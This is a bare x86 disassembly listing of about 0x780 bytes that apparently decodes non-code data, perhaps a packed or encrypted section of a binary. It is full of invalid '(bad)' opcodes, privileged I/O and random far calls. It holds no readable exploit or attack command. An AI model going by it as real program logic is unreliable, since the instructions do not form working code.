  41d129:	test   DWORD PTR [esi*1-0x3686cd01],ebx
  41d130:	repnz or ax,0x2f9b
  41d135:	cld    
  41d136:	imul   ecx,ecx,0xb7b43e1d
  41d13c:	mov    ds:0x932e430d,al
  41d141:	xchg   esi,eax
  41d142:	mov    gs,WORD PTR [edx-0x3f322606]
  41d148:	pushf  
  41d149:	sbb    ecx,ebx
  41d14b:	outs   dx,BYTE PTR ds:[esi]
  41d14c:	loope  0x41d1a0
  41d14e:	push   ecx
  41d14f:	mov    cl,0xb5
  41d151:	ss enter 0x96a2,0xeb
  41d156:	xchg   DWORD PTR [esi+0xa6fac72],esp
  41d15c:	into   
  41d15d:	and    al,0xf9
  41d15f:	pop    ds
  41d160:	push   es
  41d161:	sbb    eax,0xc523191b
  41d166:	neg    BYTE PTR [edx]
  41d168:	neg    bh
  41d16a:	aaa    
  41d16b:	adc    dh,BYTE PTR [edi]
  41d16d:	outs   dx,BYTE PTR ds:[esi]
  41d16e:	std    
  41d16f:	test   BYTE PTR [ebp+edi*4-0x24],cl
  41d173:	mov    esi,DWORD PTR [edi]
  41d175:	sbb    eax,edi
  41d177:	test   eax,0xaa2ae5ae
  41d17c:	pop    ds
  41d17d:	xor    ch,BYTE PTR [ecx+0x56]
  41d180:	push   0x15
  41d182:	fld    TBYTE PTR [esp+esi*1-0x2ddc370]
  41d189:	xlat   BYTE PTR ds:[ebx]
  41d18a:	nop
  41d18b:	mov    ch,0x31
  41d18d:	cdq    
  41d18e:	inc    eax
  41d18f:	pop    esi
  41d190:	mov    WORD PTR [edx-0x4af8e2a0],?
  41d196:	xchg   edi,eax
  41d197:	and    edx,DWORD PTR [esi+0x4d]
  41d19a:	outs   dx,DWORD PTR ds:[esi]
  41d19b:	pop    edi
  41d19c:	ins    DWORD PTR es:[edi],dx
  41d19d:	aas    
  41d19e:	call   0x723d:0x43ccb8ca
  41d1a5:	sub    DWORD PTR [ebp-0x77],0x9fbaaba3
  41d1ac:	xchg   ebp,eax
  41d1ad:	push   es
  41d1ae:	retf   
  41d1af:	add    al,0x55
  41d1b1:	call   0xe137:0xbd56efcd
  41d1b8:	fisub  DWORD PTR [ebx+0x2a]
  41d1bb:	(bad)  
  41d1bc:	and    DWORD PTR [edx-0x5f],eax
  41d1bf:	adc    cl,BYTE PTR [esi+eiz*4+0x2b]
  41d1c3:	mov    WORD PTR [ebx-0x5b4a0fb4],?
  41d1c9:	bound  eax,QWORD PTR [edi+0x1a33946a]
  41d1cf:	aad    0x7a
  41d1d1:	adc    dl,BYTE PTR [esi-0x7978bdee]
  41d1d7:	or     BYTE PTR [ecx-0x48],ch
  41d1da:	cwde   
  41d1db:	adc    DWORD PTR ds:0xd235f4fe,0x6a8160b6
  41d1e5:	sahf   
  41d1e6:	xor    DWORD PTR [ebp-0x3e],esp
  41d1e9:	adc    eax,0xbe0e66e6
  41d1ee:	fsub   st,st(5)
  41d1f0:	shl    ah,0x2
  41d1f3:	stc    
  41d1f4:	jnp    0x41d240
  41d1f6:	out    dx,eax
  41d1f7:	inc    ecx
  41d1f8:	or     ecx,DWORD PTR [esi+0x5fee2212]
  41d1fe:	dec    edx
  41d1ff:	pop    esi
  41d200:	mov    esi,0xa22e59a9
  41d205:	stc    
  41d206:	clc    
  41d207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d208:	cmc    
  41d209:	lods   al,BYTE PTR ds:[esi]
  41d20a:	in     al,dx
  41d20b:	in     al,0xea
  41d20d:	scas   eax,DWORD PTR es:[edi]
  41d20e:	pushf  
  41d20f:	cmp    al,0xbe
  41d211:	jl     0x41d1a6
  41d213:	lods   al,BYTE PTR ds:[esi]
  41d214:	xchg   edx,eax
  41d215:	add    ebp,DWORD PTR [esi+esi*2+0x1d]
  41d219:	jecxz  0x41d226
  41d21b:	xchg   DWORD PTR [edi+0x76b361ca],eax
  41d221:	inc    esi
  41d222:	add    DWORD PTR [esi],edx
  41d224:	adc    BYTE PTR [eax+eiz*2+0x3b],0x76
  41d229:	fld    TBYTE PTR [eax+0x46]
  41d22c:	ja     0x41d24b
  41d22e:	loope  0x41d208
  41d230:	adc    DWORD PTR [ebx-0x48d863c7],0x76
  41d237:	xor    DWORD PTR [ecx+0x74],ebp
  41d23a:	cmp    ch,BYTE PTR [esi]
  41d23c:	sti    
  41d23d:	mov    dh,0x6
  41d23f:	(bad)  
  41d240:	cdq    
  41d241:	and    bh,bl
  41d243:	adc    eax,0x2a4c3467
  41d248:	xchg   ecx,eax
  41d249:	xchg   ebx,eax
  41d24a:	sub    bl,ch
  41d24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d24d:	loope  0x41d22c
  41d24f:	add    BYTE PTR [edi+edi*8],al
  41d252:	pop    edi
  41d253:	mov    edi,0x5f4f364b
  41d258:	add    DWORD PTR [edx+0x25],0xbbacbb16
  41d25f:	scas   eax,DWORD PTR es:[edi]
  41d260:	mov    ds:0xd397625,eax
  41d265:	pop    eax
  41d266:	jmp    0x41d28f
  41d268:	mov    eax,ds:0x8e4d5847
  41d26d:	addr16 sub cl,0x71
  41d271:	fbld   TBYTE PTR [edx+edx*4]
  41d274:	rcl    DWORD PTR [edx+ebx*1],0x70
  41d278:	xchg   ch,dl
  41d27a:	mov    ch,BYTE PTR [ebx+0x599307d4]
  41d280:	mov    edi,0x4ffea099
  41d285:	int3   
  41d286:	mov    esp,DWORD PTR [ebx+0x75e08a2]
  41d28c:	push   0xffffffdb
  41d28e:	hlt    
  41d28f:	push   ss
  41d290:	pop    edi
  41d291:	clc    
  41d292:	(bad)  
  41d293:	fisubr WORD PTR [ebp+0x69]
  41d296:	inc    ebp
  41d297:	mov    cl,0xe2
  41d299:	cmp    ebp,ebp
  41d29b:	aaa    
  41d29c:	rcr    BYTE PTR [ecx+0x3616ad10],1
  41d2a2:	add    DWORD PTR [ecx-0x43eee3e9],eax
  41d2a8:	imul   esi,edx,0x69
  41d2ab:	ret    
  41d2ac:	or     cl,BYTE PTR [ebp-0x35]
  41d2af:	cld    
  41d2b0:	int3   
  41d2b1:	add    eax,0x83a288d4
  41d2b6:	retf   
  41d2b7:	out    0xbd,eax
  41d2b9:	lock pop ebp
  41d2bb:	rcr    DWORD PTR [eax+0x6d16fce1],1
  41d2c1:	push   ebp
  41d2c2:	(bad)  
  41d2c3:	popa   
  41d2c4:	or     eax,0x292be840
  41d2c9:	aaa    
  41d2ca:	push   esp
  41d2cb:	xchg   esp,eax
  41d2cc:	push   ebp
  41d2cd:	mov    al,ds:0x79df9d
  41d2d2:	jno    0x41d344
  41d2d4:	cmp    ecx,DWORD PTR [esi-0xf]
  41d2d7:	xchg   ecx,eax
  41d2d8:	cmp    BYTE PTR [ecx],0xec
  41d2db:	push   ebp
  41d2dc:	sbb    eax,0xaf0e8f59
  41d2e1:	cmp    eax,0xff92fb1e
  41d2e6:	pop    ss
  41d2e7:	mov    ebp,0x9ad814c2
  41d2ec:	cmp    DWORD PTR [edi+esi*8-0x147b9f7d],ebx
  41d2f3:	mov    dh,al
  41d2f5:	xchg   esp,eax
  41d2f6:	inc    esi
  41d2f7:	xchg   esp,eax
  41d2f8:	jecxz  0x41d2e2
  41d2fa:	(bad)
  41d2fd:	inc    eax
  41d2fe:	and    al,BYTE PTR [edi+ecx*8-0x119e4eb5]
  41d305:	mov    DWORD PTR [ecx+edx*2+0x41953f51],edi
  41d30c:	inc    edx
  41d30d:	rcr    edi,cl
  41d30f:	sbb    esp,DWORD PTR [esi+esi*1-0xa92ded3]
  41d316:	adc    dl,cl
  41d318:	dec    edi
  41d319:	pop    es
  41d31a:	imul   edx,ecx,0x5c
  41d31d:	xchg   esi,eax
  41d31e:	inc    edx
  41d31f:	scas   eax,DWORD PTR es:[edi]
  41d320:	or     al,0xc6
  41d322:	aad    0xb7
  41d324:	xchg   esp,eax
  41d325:	ds aaa 
  41d327:	imul   edx,DWORD PTR [ebp+0x735a8d2f],0x16
  41d32e:	arpl   WORD PTR [edi],bx
  41d330:	addr16 jg 0x41d3a6
  41d333:	cmp    eax,DWORD PTR [ecx-0x4b]
  41d336:	xlat   BYTE PTR ds:[ebx]
  41d337:	add    eax,0xf23f00f4
  41d33c:	(bad)  
  41d33e:	xor    esi,DWORD PTR [ebp-0x228d0033]
  41d344:	out    dx,al
  41d345:	sub    ebx,ebx
  41d347:	cwde   
  41d348:	test   eax,0x9cbd151b
  41d34d:	pop    es
  41d34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d34f:	arpl   bp,cx
  41d351:	arpl   WORD PTR [ecx+0x18],si
  41d354:	popa   
  41d355:	mov    ebp,DWORD PTR [ebx+0x26f7059d]
  41d35b:	inc    edx
  41d35c:	nop
  41d35d:	add    eax,0x20d8f530
  41d362:	test   al,0x36
  41d364:	push   ecx
  41d365:	pop    esp
  41d366:	cld    
  41d367:	into   
  41d368:	mov    bh,0x99
  41d36a:	or     bh,BYTE PTR [esi-0x1125cda6]
  41d370:	mov    edx,0xf16e64d6
  41d375:	sub    DWORD PTR [ecx+0x3e],esp
  41d378:	or     BYTE PTR [ebp+0x44],dl
  41d37b:	or     eax,0xd8efb2fa
  41d380:	push   0x64
  41d382:	mov    al,0x65
  41d384:	icebp  
  41d385:	dec    BYTE PTR [ecx]
  41d387:	dec    edx
  41d388:	scas   eax,DWORD PTR es:[edi]
  41d389:	lds    edx,FWORD PTR [eax]
  41d38b:	sub    DWORD PTR [esi-0x7d109264],esi
  41d391:	inc    ebx
  41d392:	sbb    BYTE PTR [eax-0xf],ah
  41d395:	xchg   ebx,eax
  41d396:	in     eax,dx
  41d397:	push   esi
  41d398:	jmp    0x41d3d6
  41d39a:	and    DWORD PTR [ecx*2-0x37a0ad28],edi
  41d3a1:	cmp    al,0x2d
  41d3a3:	pop    ds
  41d3a4:	loop   0x41d3b7
  41d3a6:	xchg   ebp,eax
  41d3a7:	stc    
  41d3a8:	cwde   
  41d3a9:	xor    eax,0xfb068638
  41d3ae:	out    dx,eax
  41d3af:	(bad)
  41d3b2:	jo     0x41d427
  41d3b4:	cli    
  41d3b5:	jl     0x41d377
  41d3b7:	in     al,dx
  41d3b8:	rcl    bh,cl
  41d3ba:	push   ecx
  41d3bb:	pop    ecx
  41d3bc:	push   edi
  41d3bd:	test   al,0xa5
  41d3bf:	xchg   ebp,eax
  41d3c0:	add    DWORD PTR [eax+0x34bb69e],eax
  41d3c6:	adc    eax,0xf1731d5d
  41d3cb:	imul   edi,DWORD PTR [edi],0xffffffc9
  41d3ce:	mov    ah,0xb4
  41d3d0:	adc    eax,0xda84c47c
  41d3d5:	fadd   st,st(2)
  41d3d7:	lods   eax,DWORD PTR ds:[esi]
  41d3d8:	lds    esi,FWORD PTR [edx-0x46]
  41d3db:	mov    bh,0x44
  41d3dd:	call   DWORD PTR [edi]
  41d3df:	fmul   QWORD PTR [eax+0x1]
  41d3e2:	fs (bad) 
  41d3e4:	call   0x27d6:0x16e2dd93
  41d3eb:	lods   al,BYTE PTR ds:[esi]
  41d3ec:	dec    esp
  41d3ed:	adc    esp,ebx
  41d3ef:	jecxz  0x41d40d
  41d3f1:	out    0xe5,al
  41d3f3:	bound  di,DWORD PTR ds:0xa179d984
  41d3fa:	sub    DWORD PTR [ecx+esi*4],ecx
  41d3fd:	cmp    DWORD PTR [edi-0x601bc849],edx
  41d403:	sub    eax,0xfaaf7aa5
  41d408:	xlat   BYTE PTR ds:[ebx]
  41d409:	stc    
  41d40a:	mov    edx,0xde5a32ef
  41d40f:	mov    bh,0xed
  41d411:	outs   dx,DWORD PTR ds:[esi]
  41d412:	mov    bl,0xab
  41d414:	sbb    BYTE PTR [eax],dl
  41d416:	cmp    BYTE PTR [eax-0x7d112942],dh
  41d41c:	adc    BYTE PTR [eax+0x54],dl
  41d41f:	out    0xa,eax
  41d421:	and    dl,al
  41d423:	out    0xdb,al
  41d425:	ret    0xf227
  41d428:	pop    ebx
  41d429:	inc    ebx
  41d42a:	or     eax,0xd9c8f228
  41d42f:	fsubrp st(4),st
  41d431:	imul   DWORD PTR [ebx+edi*4]
  41d434:	fidivr DWORD PTR [eax+ebp*1-0x1f5af1d1]
  41d43b:	int3   
  41d43c:	fnsave [eax+0x793789ec]
  41d442:	(bad)  
  41d443:	mov    al,0x77
  41d445:	and    eax,0x9f20c270
  41d44a:	lock mov cs,WORD PTR [edx+ebp*1+0x17]
  41d44f:	sub    eax,0xe0aad777
  41d454:	das    
  41d455:	jne    0x41d476
  41d457:	pop    ss
  41d458:	rcr    BYTE PTR [edx+0x5d8f8b29],cl
  41d45e:	cmovnp esi,DWORD PTR [esi+0x789841f]
  41d465:	add    bh,cl
  41d467:	cs push ebx
  41d469:	lods   eax,DWORD PTR ds:[esi]
  41d46a:	int3   
  41d46b:	and    al,BYTE PTR [esi-0x5764ec9]
  41d471:	pusha  
  41d472:	call   0x733ef85
  41d477:	sbb    ecx,DWORD PTR [ebx]
  41d479:	or     esi,eax
  41d47b:	mov    eax,ebx
  41d47d:	and    edi,edi
  41d47f:	xchg   ebx,eax
  41d480:	in     al,dx
  41d481:	ins    DWORD PTR es:[edi],dx
  41d482:	in     eax,0xe7
  41d484:	aas    
  41d485:	jnp    0x41d436
  41d487:	je     0x41d42a
  41d489:	test   esi,0xec5b75de
  41d48f:	pop    esi
  41d490:	ja     0x41d49d
  41d492:	jle    0x41d497
  41d494:	or     esp,DWORD PTR [ecx-0x4c593232]
  41d49a:	or     DWORD PTR [edx],eax
  41d49c:	int3   
  41d49d:	dec    edi
  41d49e:	int3   
  41d49f:	repnz or eax,0x9b8c39e1
  41d4a5:	inc    ebx
  41d4a6:	and    eax,DWORD PTR [eax+0x2be17d1f]
  41d4ac:	call   0x2a7a:0x4fa6008a
  41d4b3:	call   0x2416ce79
  41d4b8:	cmc    
  41d4b9:	aas    
  41d4ba:	mov    ecx,0x2d4482df
  41d4bf:	jo     0x41d507
  41d4c1:	inc    esi
  41d4c2:	dec    edi
  41d4c3:	pop    eax
  41d4c4:	repz fisttp WORD PTR [ebp+0x1c]
  41d4c8:	fist   DWORD PTR [edi]
  41d4ca:	mov    dh,0x7d
  41d4cc:	rol    BYTE PTR [eax+0x185b1c9d],0x79
  41d4d3:	jne    0x41d50f
  41d4d5:	dec    ecx
  41d4d6:	dec    eax
  41d4d7:	cmp    al,0x83
  41d4d9:	and    esi,DWORD PTR [esi+edi*4-0x5f5090a7]
  41d4e0:	dec    ebp
  41d4e1:	gs push edx
  41d4e3:	add    al,BYTE PTR [ebx+0x51]
  41d4e6:	sbb    ebx,eax
  41d4e8:	jae    0x41d51a
  41d4ea:	inc    edx
  41d4eb:	sbb    eax,0x9dc1a231
  41d4f0:	pop    esp
  41d4f1:	imul   esp,DWORD PTR [ebx],0x2ddf934b
  41d4f7:	and    eax,0xadaac053
  41d4fc:	call   0x761e3502
  41d501:	or     ebx,DWORD PTR [edx+0x3c853b5b]
  41d507:	dec    eax
  41d508:	lods   al,BYTE PTR ds:[esi]
  41d509:	xor    eax,0x36b3027e
  41d50e:	sub    eax,DWORD PTR [edi-0x261ca076]
  41d514:	lea    ebp,[edx+0x1e]
  41d517:	pop    eax
  41d518:	stos   DWORD PTR es:[edi],eax
  41d519:	outs   dx,BYTE PTR ds:[esi]
  41d51a:	push   ebp
  41d51b:	xor    al,0x4e
  41d51d:	or     eax,0xaac62c12
  41d522:	fst    st(5)
  41d524:	inc    edi
  41d525:	call   DWORD PTR [edx+0x74]
  41d528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d529:	aam    0xeb
  41d52b:	xchg   esp,eax
  41d52c:	jbe    0x41d53f
  41d52e:	or     DWORD PTR ds:0x9dfa6a9b,ebp
  41d534:	out    0x44,eax
  41d536:	mov    edi,0x5a7040f7
  41d53b:	int    0x7f
  41d53d:	imul   eax
  41d53f:	ficom  WORD PTR ds:0x7c965242
  41d545:	pop    eax
  41d546:	outs   dx,BYTE PTR ds:[esi]
  41d547:	mov    ecx,0xfffaec1f
  41d54c:	mov    bh,0x9f
  41d54e:	lods   al,BYTE PTR ds:[esi]
  41d54f:	mov    ah,0x9a
  41d551:	cmp    DWORD PTR [edi],eax
  41d553:	fistp  DWORD PTR [ecx+0x1f]
  41d556:	cmp    eax,0xd6282287
  41d55b:	sti    
  41d55c:	push   ds
  41d55d:	pmuludq mm1,QWORD PTR [edx+0x17]
  41d561:	mov    eax,0xbdb8f60c
  41d566:	mov    esi,0x4e1e2a26
  41d56b:	cmp    BYTE PTR [edi+0x46],dh
  41d56e:	aas    
  41d56f:	dec    ecx
  41d570:	ins    DWORD PTR es:[edi],dx
  41d571:	pop    ebp
  41d572:	mov    esp,0x2fe062b3
  41d577:	rcr    DWORD PTR [eax+0x3537aa11],1
  41d57d:	pop    ecx
  41d57e:	mov    edx,0x11828769
  41d583:	inc    DWORD PTR [edx-0xcce92fa]
  41d589:	lahf   
  41d58a:	lds    ecx,FWORD PTR [eax+0x60]
  41d58d:	daa    
  41d58e:	push   es
  41d58f:	pop    esp
  41d590:	cld    
  41d591:	xchg   edx,eax
  41d592:	cli    
  41d593:	lods   eax,DWORD PTR ds:[esi]
  41d594:	js     0x41d548
  41d596:	and    edi,esi
  41d598:	xchg   edx,eax
  41d599:	scas   al,BYTE PTR es:[edi]
  41d59a:	cmp    al,BYTE PTR ds:0x8c621560
  41d5a0:	cmp    DWORD PTR [ebp+0x5a5c63f0],ebx
  41d5a6:	je     0x41d53c
  41d5a8:	rol    ebx,cl
  41d5aa:	push   eax
  41d5ab:	push   ebx
  41d5ac:	(bad)  
  41d5ad:	sbb    ch,BYTE PTR [edx]
  41d5af:	add    esi,DWORD PTR [esi+0x23]
  41d5b2:	es int 0xc4
  41d5b5:	and    edx,DWORD PTR [ebx-0x2b]
  41d5b8:	inc    ecx
  41d5b9:	addr16 push ss
  41d5bb:	into   
  41d5bc:	ret    0x79a0
  41d5bf:	mov    eax,ds:0x8d8838c8
  41d5c4:	adc    al,0x4a
  41d5c6:	dec    edi
  41d5c7:	sti    
  41d5c8:	inc    ebx
  41d5c9:	adc    bl,ch
  41d5cb:	inc    ebp
  41d5cc:	xchg   ebp,eax
  41d5cd:	dec    ecx
  41d5ce:	lods   eax,DWORD PTR ds:[esi]
  41d5cf:	int    0x4c
  41d5d1:	test   DWORD PTR [edx],ebp
  41d5d3:	imul   edi,DWORD PTR [ecx+esi*8+0x25],0xfffffffb
  41d5d8:	cdq    
  41d5d9:	jp     0x41d608
  41d5db:	sbb    al,0xc
  41d5dd:	mov    ds:0x3cb19270,al
  41d5e2:	and    DWORD PTR [ebp+0x51],edi
  41d5e5:	pop    esp
  41d5e6:	xchg   ebx,eax
  41d5e7:	jns    0x41d5fa
  41d5e9:	out    0x6b,al
  41d5eb:	mov    ecx,0x992a1aed
  41d5f0:	push   edi
  41d5f1:	xor    eax,0x404cc806
  41d5f6:	adc    ebx,DWORD PTR [ecx-0x43]
  41d5f9:	enter  0x6315,0x7e
  41d5fd:	jl     0x41d58a
  41d5ff:	xchg   ecx,eax
  41d600:	test   BYTE PTR [ebx+ebp*1+0x78],bl
  41d604:	xchg   esp,eax
  41d605:	mov    ecx,0xb1de72ad
  41d60a:	rcl    BYTE PTR [edx-0x17],1
  41d60d:	xchg   ebx,eax
  41d60e:	imul   esi,DWORD PTR ds:0xf0f4e6bb,0xffffffb5
  41d615:	adc    dh,bl
  41d617:	and    al,0x3
  41d619:	sti    
  41d61a:	imul   esp,eax,0xf3050fb1
  41d620:	mul    BYTE PTR [ebx]
  41d622:	test   ecx,eax
  41d624:	sbb    eax,0x752e6022
  41d629:	xchg   esp,eax
  41d62a:	mov    edi,0x7ad7a3a9
  41d62f:	jns    0x41d63a
  41d631:	popf   
  41d632:	pushf  
  41d633:	cli    
  41d634:	jge    0x41d69b
  41d636:	in     eax,dx
  41d637:	push   es
  41d638:	jo     0x41d69e
  41d63a:	scas   al,BYTE PTR es:[edi]
  41d63b:	sub    ecx,DWORD PTR [ecx+0x2a]
  41d63e:	jbe    0x41d5c0
  41d640:	cdq    
  41d641:	dec    edi
  41d642:	mov    esp,0xc1688e9e
  41d647:	lahf   
  41d648:	push   esi
  41d649:	mov    bl,0x3f
  41d64b:	mov    ds:0x722c33cd,al
  41d650:	ds jne 0x41d65e
  41d653:	dec    edi
  41d654:	mul    BYTE PTR [edi+eax*8]
  41d657:	add    al,0x24
  41d659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d65a:	shr    bh,1
  41d65c:	in     al,0x4b
  41d65e:	push   0xffffffb6
  41d660:	pop    esp
  41d661:	adc    eax,0xfdffd8ce
  41d666:	add    BYTE PTR [eax+0x557305af],bh
  41d66c:	fs pop esp
  41d66e:	fisttp WORD PTR [esi-0x12267878]
  41d674:	pop    eax
  41d675:	aad    0x48
  41d677:	(bad)  
  41d678:	dec    edi
  41d679:	imul   eax,DWORD PTR [edx+0x40fc36b1],0x12dac632
  41d683:	imul   ebx,ecx,0xffffffbb
  41d686:	jp     0x41d677
  41d688:	sub    bh,BYTE PTR [ecx-0x6b]
  41d68b:	test   DWORD PTR [eax],esp
  41d68d:	xor    edx,DWORD PTR [ecx+0x1a03227e]
  41d693:	pushf  
  41d694:	push   ecx
  41d695:	adc    ch,BYTE PTR [esi-0x23]
  41d698:	xchg   ebp,eax
  41d699:	inc    ebx
  41d69a:	mov    edx,0xbda4e739
  41d69f:	xchg   ebx,eax
  41d6a0:	mov    dh,0x70
  41d6a2:	shl    BYTE PTR [esi-0x6c],1
  41d6a5:	ins    BYTE PTR es:[edi],dx
  41d6a6:	(bad)  
  41d6a7:	dec    edx
  41d6a9:	cwde   
  41d6aa:	int3   
  41d6ab:	sbb    edx,edi
  41d6ad:	fdivr  st,st(6)
  41d6af:	pop    sp
  41d6b1:	and    al,0x21
  41d6b3:	sub    eax,eax
  41d6b5:	xor    BYTE PTR [ebx-0x68],dh
  41d6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6b9:	ins    DWORD PTR es:[edi],dx
  41d6ba:	and    DWORD PTR [edx-0x78bbf441],ecx
  41d6c0:	mov    ah,0x7c
  41d6c2:	mov    ch,BYTE PTR [eax+ecx*2-0x15]
  41d6c6:	xchg   ebp,eax
  41d6c7:	pop    ebp
  41d6c8:	pop    es
  41d6c9:	cld    
  41d6ca:	icebp  
  41d6cb:	aas    
  41d6cc:	pop    edi
  41d6cd:	(bad)  
  41d6ce:	adc    ecx,esi
  41d6d0:	(bad)  
  41d6d1:	stos   DWORD PTR es:[edi],eax
  41d6d2:	lods   al,BYTE PTR ds:[esi]
  41d6d3:	popf   
  41d6d4:	stc    
  41d6d5:	xlat   BYTE PTR ds:[ebx]
  41d6d6:	ret    
  41d6d7:	test   DWORD PTR [ebp*4+0x7960e36a],ebx
  41d6de:	rcl    BYTE PTR [esi-0x270bc81b],cl
  41d6e4:	xchg   eax,ecx
  41d6e6:	bound  ebp,QWORD PTR [ebp+0x32]
  41d6e9:	mov    ds:0x711f223,al
  41d6ee:	xchg   ecx,eax
  41d6ef:	ret    0xb3ed
  41d6f2:	jnp    0x41d726
  41d6f4:	scas   al,BYTE PTR es:[edi]
  41d6f5:	xchg   esi,eax
  41d6f6:	adc    eax,ebx
  41d6f8:	mov    ebp,0xe4775cab
  41d6fd:	fist   DWORD PTR [eax+0x7d23223f]
  41d703:	mov    ebx,DWORD PTR [edi+eax*4+0x4bf45b1e]
  41d70a:	test   BYTE PTR [edx],bl
  41d70c:	scas   al,BYTE PTR es:[edi]
  41d70d:	mov    bh,0xb3
  41d70f:	ror    BYTE PTR [esi],1
  41d711:	jl     0x41d766
  41d713:	mov    edx,0x44962a5a
  41d718:	dec    ecx
  41d719:	ret    0x19f1
  41d71c:	pop    edx
  41d71d:	call   0x3f1d:0xdc4ff5c4
  41d724:	ror    BYTE PTR fs:[ecx-0x158df683],cl
  41d72b:	or     BYTE PTR [edx+0x79b2e5a0],dh
  41d731:	fs pop es
  41d733:	(bad)  
  41d734:	dec    edi
  41d735:	sbb    eax,0x8de62293
  41d73a:	cli    
  41d73b:	adc    dh,dh
  41d73d:	mov    al,0xad
  41d73f:	fistp  WORD PTR [edi-0x62]
  41d742:	cmp    ecx,edi
  41d744:	mov    es,WORD PTR [eax]
  41d746:	pop    ds
  41d747:	sub    al,0x71
  41d749:	int3   
  41d74a:	push   edx
  41d74b:	inc    ebx
  41d74c:	ins    BYTE PTR es:[edi],dx
  41d74d:	ins    BYTE PTR es:[edi],dx
  41d74e:	inc    ecx
  41d74f:	mov    ah,BYTE PTR [ebx+edi*1+0x78]
  41d753:	mov    ds:0x9171cf30,eax
  41d758:	xor    esp,ecx
  41d75a:	jmp    0xacafbf3e
  41d75f:	hlt    
  41d760:	into   
  41d761:	(bad)  
  41d762:	jno    0x41d736
  41d764:	ja     0x41d70c
  41d766:	cmp    eax,0xf6b80b0
  41d76b:	xor    BYTE PTR [ecx-0x54],dl
  41d76e:	xchg   DWORD PTR [edx],ebp
  41d770:	mov    al,ds:0x932374f5
  41d775:	and    al,0x24
  41d777:	add    bh,bl
  41d779:	xchg   BYTE PTR [eax+0x51da4e6c],ch
  41d77f:	push   esp
  41d780:	pop    edx
  41d781:	mov    BYTE PTR [ecx-0x2a],ah
  41d784:	popa   
  41d785:	test   DWORD PTR [ebp-0x28bab7fb],edx
  41d78b:	sub    DWORD PTR [eax-0x586963d2],eax
  41d791:	call   0xd3096ac9
  41d796:	cld    
  41d797:	pushf  
  41d798:	or     esp,eax
  41d79a:	jbe    0x41d777
  41d79c:	aad    0xaf
  41d79e:	cmp    bl,BYTE PTR [ebx+0xb]
  41d7a1:	sub    al,0x76
  41d7a3:	rol    BYTE PTR [ecx-0x5b910857],1
  41d7a9:	cli    
  41d7aa:	pop    ebp
  41d7ab:	jns    0x41d797
  41d7ad:	or     cl,BYTE PTR [edi+ecx*2]
  41d7b0:	into   
  41d7b1:	fsub   DWORD PTR [ebx-0x277b409d]
  41d7b7:	cmp    ch,BYTE PTR [si-0x7ca5]
  41d7bc:	test   DWORD PTR [ebx-0x12],esi
  41d7bf:	test   al,0x58
  41d7c1:	sbb    al,0x9c
  41d7c3:	popa   
  41d7c4:	jnp    0x41d7cd
  41d7c6:	or     DWORD PTR [ebp+0x32],0x411a1eba
  41d7cd:	stc    
  41d7ce:	or     BYTE PTR [esp+ebp*1],bh
  41d7d1:	and    BYTE PTR [ebp+0x5adceaa0],0x19
  41d7d8:	retf   0x1933
  41d7db:	sbb    eax,0xa695f7b0
  41d7e0:	inc    DWORD PTR [si+0x692c]
  41d7e5:	cmp    esi,ebx
  41d7e7:	add    ch,BYTE PTR [ebx+0x6d]
  41d7ea:	xor    bh,bh
  41d7ec:	pop    ds
  41d7ed:	xchg   ebx,eax
  41d7ee:	mov    eax,0x3b6b2648
  41d7f3:	xor    al,0x5
  41d7f5:	mov    ds:0x43415e9a,eax
  41d7fa:	outs   dx,BYTE PTR ds:[esi]
  41d7fb:	jno    0x41d7e3
  41d7fd:	pusha  
  41d7fe:	mov    dl,0x4
  41d800:	adc    esp,ebp
  41d802:	add    ah,BYTE PTR [ecx+ecx*4]
  41d805:	pushf  
  41d806:	in     eax,dx
  41d807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d808:	aaa    
  41d809:	mov    bl,0x21
  41d80b:	icebp  
  41d80c:	add    dh,BYTE PTR [edx]
  41d80e:	scas   eax,DWORD PTR es:[edi]
  41d80f:	sbb    al,0xcc
  41d811:	jbe    0x41d800
  41d813:	imul   esp,ebp,0xffffffb1
  41d816:	mov    ds:0x6a636ec1,al
  41d81b:	xor    cl,0x77
  41d81e:	mov    ecx,0xd431fb2d
  41d823:	add    bl,BYTE PTR [edx]
  41d825:	pop    es
  41d826:	mov    ds:0x6f3499d7,al
  41d82b:	xlat   BYTE PTR ds:[ebx]
  41d82c:	push   ebx
  41d82d:	push   es
  41d82e:	sar    ah,1
  41d830:	(bad)  
  41d831:	push   0xf1afad71
  41d836:	jge    0x41d88b
  41d838:	aaa    
  41d839:	mov    edx,0x95f785da
  41d83e:	lods   al,BYTE PTR ds:[esi]
  41d83f:	fwait
  41d840:	cmp    al,0xf6
  41d842:	sbb    eax,0xee6f64ba
  41d847:	ins    BYTE PTR es:[edi],dx
  41d848:	xchg   edx,eax
  41d849:	mov    ds:0x556fedb8,eax
  41d84e:	ffree  st(5)
  41d850:	mov    dh,0x32
  41d852:	xlat   BYTE PTR ds:[ebx]
  41d853:	cwde   
  41d854:	xchg   BYTE PTR [esi-0x34],dh
  41d857:	popa   
  41d858:	enter  0x8b14,0xf2
  41d85c:	bound  esi,QWORD PTR [edx-0x33a58b53]
  41d862:	jnp    0x41d8b1
  41d864:	xor    DWORD PTR [edx-0x3dbbebbc],esp
  41d86a:	dec    cl
  41d86c:	and    eax,0x97c6381
  41d871:	xchg   ah,cl
  41d873:	sbb    bl,BYTE PTR [edx+esi*1+0x16]
  41d877:	daa    
  41d878:	inc    eax
  41d879:	clc    
  41d87a:	mov    cl,0xf0
  41d87c:	aad    0xd3
  41d87e:	xchg   edi,eax
  41d87f:	fstp   DWORD PTR [esi]
  41d881:	outs   dx,BYTE PTR ds:[esi]
  41d882:	pop    eax
  41d883:	mov    dh,0xab
  41d885:	sbb    DWORD PTR [eax],esp
  41d887:	daa    
  41d888:	cmp    BYTE PTR [edi],0xa8
  41d88b:	dec    ebp
  41d88c:	loop   0x41d8c6
  41d88e:	push   edi
  41d88f:	mov    ebx,0x24c5dfb
  41d894:	pop    ds
  41d895:	push   0x37
  41d897:	or     BYTE PTR [eax+0x3a],dl
  41d89a:	mov    WORD PTR [ecx],gs
  41d89c:	xchg   esi,eax
  41d89d:	pushf  
  41d89e:	sbb    dh,cl
